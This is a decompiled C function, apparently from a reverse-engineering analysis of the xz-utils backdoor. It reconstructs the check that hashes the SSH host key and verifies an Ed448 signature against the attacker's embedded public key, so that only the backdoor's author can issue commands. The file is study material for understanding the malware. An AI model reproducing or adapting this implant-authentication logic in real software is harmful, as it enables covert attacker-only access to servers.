// /home/kali/xzre-ghidra/xzregh/107630_verify_signature.c
// Function: verify_signature @ 0x107630
// Calling convention: __stdcall
// Prototype: BOOL __stdcall verify_signature(sshkey * sshkey, u8 * signed_data, u64 sshkey_digest_offset, u64 signed_data_size, u8 * signature, u8 * ed448_raw_key, global_context_t * global_ctx)


/*
 * AutoDoc: Computes the host-key digest that sits at sshkey_digest_offset inside the signed blob and then verifies the Ed448 command
 * signature. RSA and DSA keys delegate to rsa_key_hash/dsa_key_hash, ECDSA serialises the EC_POINT in uncompressed form with a
 * 32-bit length prefix, and Ed25519 prepends a 0x20000000 tag plus the raw 32-byte key. Once the digest is spliced into
 * signed_data the helper loads the attacker’s Ed448 public key with EVP_PKEY_new_raw_public_key(0x440, …) and invokes
 * EVP_DigestVerify over the signed_data[0:tbslen) region; only a valid Ed448 signature lets the caller continue.
 */

#include "xzre_types.h"

BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u64 signed_data_size,
                     u8 *signature,u8 *ed448_raw_key,global_context_t *global_ctx)

{
  size_t tbs_len;
  imported_funcs_t *imports;
  EC_KEY *ecdsa_key;
  u8 *ed25519_pub;
  BOOL success;
  uint ec_point_len;
  int status;
  EC_POINT *ecdsa_pubkey;
  EC_GROUP *ecdsa_group;
  size_t written_len;
  EVP_PKEY *ed448_pkey;
  EVP_MD_CTX *mdctx;
  long i;
  size_t serialized_len;
  u32 *scratch_cursor;
  undefined8 local_c1;
  undefined8 uStack_b9;
  u8 digest_scratch[128];
  
  if (sshkey == (sshkey *)0x0) {
    return FALSE;
  }
  if (signed_data == (u8 *)0x0) {
    return FALSE;
  }
  if (signed_data_size == 0) {
    return FALSE;
  }
  if (0xffffffffffffffde < sshkey_digest_offset) {
    return FALSE;
  }
  tbs_len = sshkey_digest_offset + 0x20;
  if (global_ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  if (signed_data_size < tbs_len) {
    return FALSE;
  }
  imports = global_ctx->imported_funcs;
  if (imports == (imported_funcs_t *)0x0) {
    return FALSE;
  }
  status = sshkey->type;
  if (status == 2) {
    ecdsa_key = sshkey->ecdsa;
    local_c1 = 0;
    uStack_b9 = 0;
    scratch_cursor = digest_scratch;
    for (i = 0x79; i != 0; i = i + -1) {
      *(BOOL *)scratch_cursor = signed_data_size < tbs_len;
      scratch_cursor = (undefined4 *)((long)scratch_cursor + 1);
    }
    if (ecdsa_key == (EC_KEY *)0x0) {
      return FALSE;
    }
    if (imports->EC_KEY_get0_public_key == (pfn_EC_KEY_get0_public_key_t)0x0) {
      return FALSE;
    }
    if (imports->EC_KEY_get0_group == (pfn_EC_KEY_get0_group_t)0x0) {
      return FALSE;
    }
    if (imports->EC_POINT_point2oct == (pfn_EC_POINT_point2oct_t)0x0) {
      return FALSE;
    }
    ecdsa_pubkey = (*imports->EC_KEY_get0_public_key)(ecdsa_key);
    ecdsa_group = (*imports->EC_KEY_get0_group)(ecdsa_key);
    serialized_len = (*imports->EC_POINT_point2oct)(ecdsa_group,ecdsa_pubkey,4,(uchar *)0x0,0,(BN_CTX *)0x0);
    if (0x85 < serialized_len) {
      return FALSE;
    }
    ec_point_len = (uint)serialized_len;
    local_c1 = CONCAT44(*(uint *)((u8 *)&local_c1 + 4),
                        ec_point_len >> 0x18 | (ec_point_len & 0xff0000) >> 8 | (ec_point_len & 0xff00) << 8 |
                        ec_point_len << 0x18);
    written_len = (*imports->EC_POINT_point2oct)
                      (ecdsa_group,ecdsa_pubkey,4,(uchar *)((long)&local_c1 + 4),serialized_len,(BN_CTX *)0x0);
    if (serialized_len != written_len) {
      return FALSE;
    }
    serialized_len = serialized_len + 4;
  }
  else {
    if (status < 3) {
      if (status == 0) {
        success = rsa_key_hash(sshkey->rsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,imports);
      }
      else {
        if (status != 1) {
          return FALSE;
        }
        success = dsa_key_hash(sshkey->dsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,global_ctx);
      }
      goto LAB_001076f8;
    }
    if (status != 3) {
      return FALSE;
    }
    ed25519_pub = sshkey->ed25519_pk;
    uStack_b9 = 0;
    scratch_cursor = digest_scratch;
    for (i = 5; i != 0; i = i + -1) {
      *scratch_cursor = 0;
      scratch_cursor = scratch_cursor + 1;
    }
    if (ed25519_pub == (u8 *)0x0) {
      return FALSE;
    }
    local_c1 = 0x20000000;
    i = 0;
    do {
      *(u8 *)((long)&local_c1 + i + 4) = ed25519_pub[i];
      i = i + 1;
    } while (i != 0x20);
    serialized_len = 0x24;
  }
  success = sha256(&local_c1,serialized_len,signed_data + sshkey_digest_offset,
                 signed_data_size - sshkey_digest_offset,imports);
LAB_001076f8:
  if ((((success != FALSE) && (imports = global_ctx->imported_funcs, imports != (imported_funcs_t *)0x0)
       ) && (success = contains_null_pointers(&imports->EVP_PKEY_new_raw_public_key,6), success == FALSE)
      ) && ((ed448_raw_key != (u8 *)0x0 &&
            (ed448_pkey = (*imports->EVP_PKEY_new_raw_public_key)(0x440,(ENGINE *)0x0,ed448_raw_key,0x39),
            ed448_pkey != (EVP_PKEY *)0x0)))) {
    mdctx = (*imports->EVP_MD_CTX_new)();
    if (mdctx != (EVP_MD_CTX *)0x0) {
      status = (*imports->EVP_DigestVerifyInit)
                        (mdctx,(EVP_PKEY_CTX **)0x0,(EVP_MD *)0x0,(ENGINE *)0x0,ed448_pkey);
      if ((status == 1) &&
         (status = (*imports->EVP_DigestVerify)(mdctx,signature,0x72,signed_data,tbs_len), status == 1)) {
        (*imports->EVP_MD_CTX_free)(mdctx);
        (*imports->EVP_PKEY_free)(ed448_pkey);
        return TRUE;
      }
      (*imports->EVP_MD_CTX_free)(mdctx);
    }
    (*imports->EVP_PKEY_free)(ed448_pkey);
  }
  return FALSE;
}

